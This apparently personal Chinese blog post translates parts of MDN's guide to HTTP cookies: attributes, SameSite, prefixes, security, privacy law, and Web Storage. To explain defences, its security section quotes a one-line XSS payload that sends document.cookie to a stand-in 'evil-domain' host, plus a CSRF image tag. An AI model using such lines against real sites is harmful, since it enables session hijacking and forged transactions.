<h3 id="限制访问-cookie">限制访问 Cookie</h3>
<p>有两种方法可以确保 <code>Cookie</code> 被安全发送，并且不会被意外的参与者或脚本访问：<code>Secure</code> 属性和<code>HttpOnly</code> 属性。</p>
<p>标记为 Secure 的 Cookie 只应通过被 HTTPS 协议加密过的请求发送给服务端，因此可以预防 <code>{{Glossary（“ MitM”，“ man-in-the -middle“）}} </code>攻击者的攻击。但即便设置了 Secure标记，敏感信息也不应该通过 Cookie 传输，因为 Cookie 有其固有的不安全性，Secure标记也无法提供确实的安全保障, 例如，可以访问客户端硬盘的人可以读取它。</p>
<p>从 Chrome 52 和 Firefox 52 开始，不安全的站点（<code>http:</code>）无法使用Cookie的 Secure 标记。</p>
<p><code>JavaScript {{domxref（“ Document.cookie”）}} API </code>无法访问带有 <code>HttpOnly</code> 属性的cookie；此类 Cookie 仅作用于服务器。例如，例如，持久化服务器端会话的 Cookie 不需要对 JavaScript 可用，而应具有 <code>HttpOnly</code> 属性。此预防措施有助于缓解<a href="https://wiki.developer.mozilla.org/zh-CN/docs/Web/Security/Types_of_attacks#Cross-site_scripting_(XSS)">跨站点脚本（XSS）</a>攻击。</p>
<p>示例：</p>
<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
</code></pre></div><h3 id="cookie-的作用域">Cookie 的作用域</h3>
<p><code>Domain</code> 和 <code>Path</code> 标识定义了Cookie的<em>作用域</em>：即允许 Cookie 应该发送给哪些URL。</p>
<h4 id="domain-属性">Domain 属性</h4>
<p><code>Domain</code> 指定了哪些主机可以接受 Cookie。如果不指定，默认为 <code>{{Glossary(&quot;origin&quot;)}}</code>，<strong>不包含子域名</strong>。如果指定了Domain，则一般包含子域名。因此，指定 Domain比省略它的限制要少。但是，当子域需要共享有关用户的信息时，这可能会有所帮助。</p>
<p>例如，如果设置 <code>Domain=mozilla.org</code>，则 Cookie 也包含在子域名中（如<code>developer.mozilla.org</code>）。</p>
<p>当前大多数浏览器遵循 <a href="http://tools.ietf.org/html/rfc6265">RFC 6265</a>，设置 Domain 时 不需要加前导点。浏览器不遵循该规范，则需要加前导点，例如：<code>Domain=.mozilla.org</code></p>
<h4 id="path-属性">Path 属性</h4>
<p><code>Path</code> 标识指定了主机下的哪些路径可以接受 Cookie（该 URL 路径必须存在于请求 URL 中）。以字符 <code>%x2F</code> (&quot;/&quot;) 作为路径分隔符，子路径也会被匹配。</p>
<p>例如，设置 <code>Path=/docs</code>，则以下地址都会匹配：</p>
<ul>
<li><code>/docs</code></li>
<li><code>/docs/Web/</code></li>
<li><code>/docs/Web/HTTP</code></li>
</ul>
<h4 id="samesite-attribute">SameSite attribute</h4>
<p><code>SameSite</code> Cookie 允许服务器要求某个 cookie 在跨站请求时不会被发送，（其中<code>{{Glossary(&quot;Site&quot;)}}</code>由可注册域定义），从而可以阻止跨站请求伪造攻击（<code>{{Glossary(&quot;CSRF&quot;)}}</code>）。</p>
<p>SameSite cookies 是相对较新的一个字段，<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/headers/Set-Cookie#Browser_compatibility">所有主流浏览器都已经得到支持</a>。</p>
<p>下面是例子：</p>
<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">Set-Cookie: key=value; SameSite=Strict
</code></pre></div><p>SameSite 可以有下面三种值：</p>
<ul>
<li><strong><code>None</code></strong>。浏览器会在同站请求、跨站请求下继续发送 cookies，不区分大小写。</li>
<li><strong><code>Strict</code></strong>。浏览器将只在访问相同站点时发送 cookie。（在原有 Cookies 的限制条件上的加强，如上文 “Cookie 的作用域” 所述）</li>
<li><strong><code>Lax</code></strong>。与 <strong><code>Strict</code></strong> 类似，但用户从外部站点导航至URL时（例如通过链接）除外。 在新版本浏览器中，为默认选项，Same-site cookies 将会为一些跨站子请求保留，如图片加载或者 frames 的调用，但只有当用户从外部站点导航到URL时才会发送。如 link 链接</li>
</ul>
<p>以前，如果 SameSite 属性没有设置，或者没有得到运行浏览器的支持，那么它的行为等同于 None，Cookies 会被包含在任何请求中，包括跨站请求。</p>
<p>大多数主流浏览器正在将 <a href="https://www.chromestatus.com/feature/5088147346030592">SameSite 的默认值迁移至 Lax</a>。如果想要指定 Cookies 在同站、跨站请求都被发送，现在需要明确指定 SameSite 为 None。</p>
<h4 id="cookie-prefixes">Cookie prefixes</h4>
<p>cookie 机制的使得服务器无法确认 cookie 是在安全来源上设置的，甚至无法确定 cookie 最初是在哪里设置的。</p>
<p>子域上的易受攻击的应用程序可以使用 Domain 属性设置 cookie，从而可以访问所有其他子域上的该 cookie。会话固定攻击中可能会滥用此机制。有关主要缓解方法，请参阅<a href="https://wiki.developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks#Session_fixation">会话劫持（ session fixation）</a>。</p>
<p>但是，作为<a href="https://en.wikipedia.org/wiki/Defense_in_depth_(computing)">深度防御措施</a>，可以使用 cookie 前缀来断言有关 cookie 的特定事实。有两个前缀可用：</p>
<ul>
<li>
<p><code>__Host-</code></p>
<p>如果 cookie 名称具有此前缀，则仅当它也用 <code>Secure</code> 属性标记，是从安全来源发送的，不包括 <code>Domain</code> 属性，并将 <code>Path</code> 属性设置为 <code>/</code> 时，它才在 {{HTTPHeader(&ldquo;Set-Cookie&rdquo;)}} 标头中接受。这样，这些 cookie 可以被视为 &ldquo;domain-locked”。</p>
</li>
<li>
<p><code>__Secure-</code></p>
<p>如果 cookie 名称具有此前缀，则仅当它也用 <code>Secure</code> 属性标记，是从安全来源发送的，它才在 {{HTTPHeader(&ldquo;Set-Cookie&rdquo;)}} 标头中接受。该前缀限制要弱于 <code>__Host-</code> 前缀。</p>
</li>
</ul>
<p>带有这些前缀点 Cookie， 如果不符合其限制的会被浏览器拒绝。请注意，这确保了如果子域要创建带有前缀的 cookie，那么它将要么局限于该子域，要么被完全忽略。由于应用服务器仅在确定用户是否已通过身份验证或 CSRF 令牌正确时才检查特定的 cookie 名称，因此，这有效地充当了针对会话劫持的防御措施。</p>
<p>在应用程序服务器上，Web 应用程序<strong>必须</strong>检查完整的 cookie 名称，包括前缀 —— 用户代理程序在从请求的 {{HTTPHeader(&ldquo;Cookie&rdquo;)}} 标头中发送前缀之前，<strong>不会</strong>从 cookie 中剥离前缀。</p>
<p>有关 cookie 前缀和浏览器支持的当前状态的更多信息，请参阅 <a href="https://wiki.developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#Cookie_prefixes">Prefixes section of the Set-Cookie reference article</a>。</p>
<h4 id="javascript-通过-documentcookie-访问-cookie">JavaScript 通过 Document.cookie 访问 Cookie</h4>
<p>通过 {{domxref(&ldquo;Document.cookie&rdquo;)}} 属性可创建新的 Cookie，也可通过该属性访问非<code>HttpOnly</code>标记的Cookie。</p>
<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#658b00">document</span>.cookie = <span style="color:#cd5555">&#34;yummy_cookie=choco&#34;</span>; 
<span style="color:#658b00">document</span>.cookie = <span style="color:#cd5555">&#34;tasty_cookie=strawberry&#34;</span>; 
console.log(<span style="color:#658b00">document</span>.cookie); 
<span style="color:#228b22">// logs &#34;yummy_cookie=choco; tasty_cookie=strawberry&#34;
</span></code></pre></div><p>通过 JavaScript 创建的 Cookie 不能包含 HttpOnly 标志。</p>
<p>请留意在<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies#Security">安全</a>章节提到的安全隐患问题，JavaScript 可以通过跨站脚本攻击（XSS）的方式来窃取 Cookie。</p>
<h2 id="安全">安全</h2>
<p>信息被存在 Cookie 中时，需要明白 cookie 的值时可以被访问，且可以被终端用户所修改的。根据应用程序的不同，可能需要使用服务器查找的不透明标识符，或者研究诸如 JSON Web Tokens 之类的替代身份验证/机密机制。</p>
<p>当机器处于不安全环境时，切记<em>不能</em>通过 HTTP Cookie 存储、传输敏感信息。</p>
<p>缓解涉及Cookie的攻击的方法：</p>
<ul>
<li>使用 <code>HttpOnly</code> 属性可防止通过 JavaScript 访问 cookie 值。</li>
<li>用于敏感信息（例如指示身份验证）的 Cookie 的生存期应较短，并且 <code>SameSite</code> 属性设置为<code>Strict</code> 或 <code>Lax</code>。（请参见上方的 <a href="https://wiki.developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies$edit#">SameSite Cookie</a>。）在<a href="https://wiki.developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#Browser_compatibility">支持 SameSite 的浏览器</a>中，这样做的作用是确保不与跨域请求一起发送身份验证 cookie，因此，这种请求实际上不会向应用服务器进行身份验证。</li>
</ul>
<h3 id="会话劫持和-xss">会话劫持和 XSS</h3>
<p>在 Web 应用中，Cookie 常用来标记用户或授权会话。因此，如果 Web 应用的 Cookie 被窃取，可能导致授权用户的会话受到攻击。常用的窃取 Cookie 的方法有利用社会工程学攻击和利用应用程序漏洞进行 {{Glossary(&ldquo;XSS&rdquo;)}} 攻击。</p>
<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">(<span style="color:#8b008b;font-weight:bold">new</span> Image()).src = <span style="color:#cd5555">&#34;http://www.evil-domain.com/steal-cookie.php?cookie=&#34;</span> + <span style="color:#658b00">document</span>.cookie;
</code></pre></div><p><code>HttpOnly</code> 类型的 Cookie 用于阻止了JavaScript 对其的访问性而能在一定程度上缓解此类攻击。</p>
<h3 id="跨站请求伪造csrf">跨站请求伪造（CSRF）</h3>
<p><a href="https://en.wikipedia.org/wiki/HTTP_cookie#Cross-site_request_forgery">维基百科</a>已经给了一个比较好的 {{Glossary(&ldquo;CSRF&rdquo;)}} 例子。比如在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：</p>
<div class="highlight"><pre style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#8b008b;font-weight:bold">img</span> <span style="color:#658b00">src</span>=<span style="color:#cd5555">&#34;http://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory&#34;</span>&gt;
</code></pre></div><p>当你打开含有了这张图片的 HTML 页面时，如果你之前已经登录了你的银行帐号并且 Cookie 仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。有一些方法可以阻止此类事件的发生：</p>
<ul>
<li>对用户输入进行过滤来阻止 {{Glossary(&ldquo;XSS&rdquo;)}}；</li>
<li>任何敏感操作都需要确认；</li>
<li>用于敏感信息的 Cookie 只能拥有较短的生命周期；</li>
<li>更多方法可以查看<a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet">OWASP CSRF prevention cheat sheet</a>。</li>
</ul>
<h2 id="跟踪和隐私">跟踪和隐私</h2>
<h3 id="第三方-cookie">第三方 Cookie</h3>
<p>Cookie 与域关联。如果此域与您所在页面的域相同，则该 cookie 称为<em>第一方 cookie（ first-party cookie）</em>。如果域不同，则它是<em>第三方 cookie（third-party cookie）</em>。当托管网页的服务器设置第一方 Cookie 时，该页面可能包含存储在其他域中的服务器上的图像或其他组件（例如，广告横幅），这些图像或其他组件可能会设置第三方 Cookie。这些主要用于在网络上进行广告和跟踪。例如，<a href="https://policies.google.com/technologies/types">types of cookies used by Google</a>。第三方服务器可以基于同一浏览器在访问多个站点时发送给它的 cookie 来建立用户浏览历史和习惯的配置文件。Firefox 默认情况下会阻止已知包含跟踪器的第三方 cookie。第三方cookie（或仅跟踪 cookie）也可能被其他浏览器设置或扩展程序阻止。阻止 Cookie 会导致某些第三方组件（例如社交媒体窗口小部件）无法正常运行。</p>
<p>如果你没有公开你网站上第三方 Cookie 的使用情况，当它们被发觉时用户对你的信任程度可能受到影响。一个较清晰的声明（比如在隐私策略里面提及）能够减少或消除这些负面影响。在某些国家已经开始对Cookie制订了相应的法规，可以查看维基百科上例子<a href="https://wikimediafoundation.org/wiki/Cookie_statement">cookie statement</a>。</p>
<h3 id="cookie-相关规定">Cookie 相关规定</h3>
<p>涉及使用 Cookie 的法律或法规包括：</p>
<ul>
<li>欧盟通用数据隐私法规（GDPR）</li>
<li>欧盟的《隐私权指令》</li>
<li>加州消费者隐私法</li>
</ul>
<p>这些规定具有全球影响力，因为它们适用于这些司法管辖区（欧盟和加利福尼亚）的用户访问的万维网上的任何站点，但请注意，加利福尼亚州的法律仅适用于总收入超过2500万美元的实体其他事情。）</p>
<p>这些法规包括以下要求：</p>
<ul>
<li>向用户表明您的站点使用 cookie。</li>
<li>允许用户选择不接收某些或所有 cookie。</li>
<li>允许用户在不接收 Cookie 的情况下使用大部分服务。</li>
</ul>
<p>可能还存在其他法规来管理您当地的Cookie。您有责任了解并遵守这些规定。有些公司提供 &ldquo;cookie banner&rdquo; 代码，可帮助您遵守这些法规。</p>
<p>可以通过<a href="https://en.wikipedia.org/wiki/HTTP_cookie#EU_cookie_directive">维基百科的相关内容</a>获取最新的各国法律和更精确的信息。</p>
<h4 id="禁止追踪-do-not-track">禁止追踪 Do-Not-Track</h4>
<p>虽然并没有法律或者技术手段强制要求使用 {{HTTPHeader(&ldquo;DNT&rdquo;)}}，但是通过{{HTTPHeader(&ldquo;DNT&rdquo;)}} 可以告诉Web程序不要对用户行为进行追踪或者跨站追踪。查看{{HTTPHeader(&ldquo;DNT&rdquo;)}} 以获取更多信息。</p>
<h4 id="欧盟-cookie-指令">欧盟 Cookie 指令</h4>
<p>关于 Cookie，欧盟已经在<a href="http://eur-lex.europa.eu/legal-content/EN/TXT/?uri=CELEX:32009L0136">2009/136/EC指令</a>中提了相关要求，该指令已于2011年5月25日生效。虽然指令并不属于法律，但它要求欧盟各成员国通过制定相关的法律来满足该指令所提的要求。当然，各国实际制定法律会有所差别。</p>
<p>该欧盟指令的大意：在征得用户的同意之前，网站不允许通过计算机、手机或其他设备存储、检索任何信息。自从那以后，很多网站都在网站声明中添加了相关说明，告诉用户他们的 Cookie 将用于何处。</p>
<h3 id="僵尸-cookie-和删不掉的-cookie">僵尸 Cookie 和删不掉的 Cookie</h3>
<p>Cookie的一个极端使用例子是僵尸Cookie（或称之为“删不掉的Cookie”），这类 Cookie 较难以删除，甚至删除之后会自动重建。这些技术违反了用户隐私和用户控制的原则，可能违反了数据隐私法规，并可能使使用它们的网站承担法律责任。它们一般是使用 <a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API">Web storage API</a>、Flash本地共享对象或者其他技术手段来达到的。相关内容可以看：</p>
<ul>
<li><a href="https://github.com/samyk/evercookie">Evercookie by Samy Kamkar</a></li>
<li><a href="https://en.wikipedia.org/wiki/Zombie_cookie">在维基百科上查看僵尸Cookie</a></li>
</ul>
<h2 id="在浏览器中存储信息的其他方式">在浏览器中存储信息的其他方式</h2>
<p>在浏览器中存储数据的另一种方法是 <a href="https://wiki.developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API/Using_the_Web_Storage_API">Web Storage API</a>。<a href="https://wiki.developer.mozilla.org/en-US/docs/Web/API/Window/sessionStorage">window.sessionStorage</a> 和<a href="https://wiki.developer.mozilla.org/en-US/docs/Web/API/Window/localStorage">window.localStorage</a> 属性与持续时间中的会话和永久 cookie 相对应，但是存储限制比 cookie大，并且永远不会发送到服务器。</p>
<p>可以使用 <a href="https://wiki.developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API">IndexedDB API</a> 或基于它构建的库来存储更多结构化的数据。</p>
<h1 id="总结">总结</h1>
<p>这三种缓存都是保存在浏览器端，且都是同源的。</p>
<p>cookie数据始终在同源的http请求中携带（即使不需要），即cookie在浏览器和服务器间来回传递；cookie数据还有路径（path）的概念，可以限制cookie只属于某个路径下。存储大小限制也不同，cookie数据不能超过4k，同时因为每次http请求都会携带cookie，所以cookie只适合保存很小的数据，如会话标识。</p>
<p>不同之处体现在以下几个方面：</p>
<ul>
<li>存储大小不同
而sessionStorage和localStorage不会自动把数据发给服务器，仅在本地保存。sessionStorage和localStorage 虽然也有存储大小的限制，但比cookie大得多，可以达到5M或更大。</li>
<li>数据有效期不同
<ul>
<li>sessionStorage：仅在当前浏览器窗口关闭前有效，自然也就不可能持久保持；</li>
<li>localStorage：始终有效，窗口或浏览器关闭也一直保存，因此用作持久数据；（<em>在新增localStorage前清空之前缓存</em>）</li>
<li>cookie：只在设置的cookie过期时间之前一直有效，即使窗口或浏览器关闭。</li>
</ul>
</li>
<li>作用域不同
<ul>
<li>sessionStorage 不在不同的浏览器窗口中共享，即使是同一个页面；</li>
<li>localStorage 在所有同源窗口中都是共享的；</li>
<li>cookie 也是在所有同源窗口中都是共享的。</li>
<li>Web Storage 支持事件通知机制，可以将数据更新的通知发送给监听者。Web Storage 的 api 接口使用更方便。</li>
</ul>
</li>
<li>Web Storage带来的好处
<ul>
<li>减少网络流量：一旦数据保存在本地之后，就可以避免再向服务器请求数据，因此减少不必要的数据请求，减少数据在浏览器和服务器间不必要的来回传递。</li>
<li>快速显示数据：性能好，从本地读数据比通过网络从服务器上获得数据快得多，本地数据可以及时获得，再加上网页本身也可以有缓存，因此整个页面和数据都在本地的话，可以立即显示。</li>
<li>临时存储：很多时候数据只需要在用户浏览一组页面期间使用，关闭窗口后数据就可以丢弃了，这种情况使用sessionStorage非常方便</li>
</ul>
</li>
</ul>
<p>sessionStorage与页面js数据对象（全局变量）的区别</p>
<ul>
<li>页面中一般的js对象的生存期仅在当前页面有效，因此刷新页面或转到另一页面这样的重新加载页面的情况，数据就不存在了。</li>
<li>而sessionStorage只要同源的同窗口中，刷新页面或进入同源的不同页面，数据始终存在，也就是说只要浏览器不关闭，数据仍然存在。</li>
</ul>
<hr>
<h1 id="reference">Reference</h1>
<ol>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/localStorage">https://developer.mozilla.org/zh-CN/docs/Web/API/Window/localStorage</a></li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/sessionStorage">https://developer.mozilla.org/zh-CN/docs/Web/API/Window/sessionStorage</a></li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Storage_API/Using_the_Web_Storage_API">https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Storage_API/Using_the_Web_Storage_API</a></li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies</a></li>
</ol>

                    
                    <HR width="100%" id="EOF">
                    <p style="color:#777;">
                        Last modified on 2020-07-25 14:42
                        &nbsp;
                        <span id="busuanzi_container_page_pv" style="color:#777;">
                            This.pv: <span id="busuanzi_value_page_pv" style="color:#777;"></span>
                        </span>
                    </p>
                    
                </div>

            </div>
            
            
            <nav class="post-pagination">

                
                <a class="newer-posts" href="https://www.openheart.icu/cs/%E5%8A%A8%E6%80%81%E6%9F%A5%E6%89%BE%E8%A1%A8%E4%B8%8E%E9%9D%99%E6%80%81%E6%9F%A5%E6%89%BE%E8%A1%A8/">
			Next<br>Static Search Table &amp; Dynamic Search Table
                </a>
                
                
                
                <a class="older-posts" href="https://www.openheart.icu/cs/csharp-in-depth/">
			Previous<br>C# in Depth
                </a>
                
            </nav>
            <div class="post-comment-wrapper">
                


<div id="gitalk-container"></div>






            </div>
        </div>
    </div>
</div>

            </div><div id="single-column-footer">
	
	<i class="fa fa-weixin" aria-hidden="true"></i>
	Case42
	<br>
	<i class="fa fa-envelope" aria-hidden="true"></i>
	krisnie42@gmail.com
	<br>
		site pv:<span id="busuanzi_value_site_pv_m"></span>
	| 
		site uv:<span id="busuanzi_value_site_uv_m"></span>
	<br>
	鲁ICP备20007116号
	<br>
	Powered by Hugo | Theme - <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a>
	
	<br>
	
	
	&copy;
		
		2020 ALL RIGHTS RESERVED KRIS NIE
		
	<script>
		$(function(){
			$("#busuanzi_value_site_uv").bind('DOMNodeInserted',function(e){
				console.log('DOMNodeInserted');
				debugger;
				$('#busuanzi_value_site_uv_m').after($('#busuanzi_value_site_uv').text()); 
				$('#busuanzi_value_site_pv_m').after($('#busuanzi_value_site_pv').text());
			});
		})
	</script>
</div>
            </div>
    <script>
let app;

app = new Vue({
    el: '#app',
    data: {
        scrollY: 0,
        navOpacity: 0,
        isDrawerOpen: false,
        mounted: false,
        isDarkMode: false
    },
    methods: {
            sgn(t, x) {
                let k = 1. / (1. - 2 * t);
                if (x <= t) return 0;
                else if (x >= 1 - t) return 1;
                else {
                    return k * (x - t);
                }
            },
            handleScroll() {
                this.scrollY = window.scrollY;
                this.navOpacity = this.sgn(.0, Math.min(1, Math.max(0, window.scrollY / (this.pageHeadHeight() - this.navBarHeight() * 0.8))));
                const {navBar, navBackground, navTitle, extraContainer, streamContainer} = this.$refs;

                if (this.navOpacity >= 1) {
                    navBackground.style.opacity = 1;
                    navTitle.style.opacity = 1;
                } else {
                    navBackground.style.opacity = 0;
                    navTitle.style.opacity = 0;
                }
            },
            handleResize() {
                const {navBar, navBackground, navTitle, extraContainer, streamContainer} = this.$refs;
                extraContainer.style.left = (streamContainer.offsetWidth - extraContainer.offsetWidth) + 'px';
            },
            navBarHeight() {
                return this.$refs.navBar.offsetHeight;
            },
            pageHeadHeight() {
                return this.$refs.pageHead.offsetHeight;
            },
            toggleDrawer() {
                this.isDrawerOpen = !this.isDrawerOpen;
                document.getElementsByTagName('html')[0].style.overflow = this.isDrawerOpen ? 'hidden' : 'unset';
            },
            closeDrawer() {
                this.isDrawerOpen = false;
                document.getElementsByTagName('html')[0].style.overflow = this.isDrawerOpen ? 'hidden' : 'unset';
            },
            toggleDarkMode() {
                this.isDarkMode = !this.isDarkMode;
                if (this.isDarkMode==true){
                    document.cookie = "night=1;path=/";
                    document.body.classList.add("night");
                } else {
                    document.cookie = "night=0;path=/";
                    document.body.classList.remove("night");
                }
            }
    },
    created() {
        window.addEventListener('scroll', this.handleScroll);
        window.addEventListener('resize', this.handleResize);
        window._nonDesktop = function () {
            let check = false;
            (function (a) {
                if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(a) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0, 4))) check = true;
            })(navigator.userAgent || navigator.vendor || window.opera);
            return check;
        };
        
        var night = document.cookie.replace(/(?:(?:^|.*;\s*)night\s*\=\s*([^;]*).*$)|^.*$/, "$1");
        if (night==""){
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                
            }
        }else{
            
            if (night=="1") {
                this.toggleDarkMode();
            }
        }
    },
    mounted() {
        this.handleScroll();
        this.handleResize();
        this.mounted = true;

        
    },
    destroyed() {
        window.removeEventListener('scroll', this.handleScroll);
        window.removeEventListener('resize', this.handleResize);
    }
});
</script>

<script src="https://www.openheart.icu//js/journal.js"></script>

    </body>
</html>
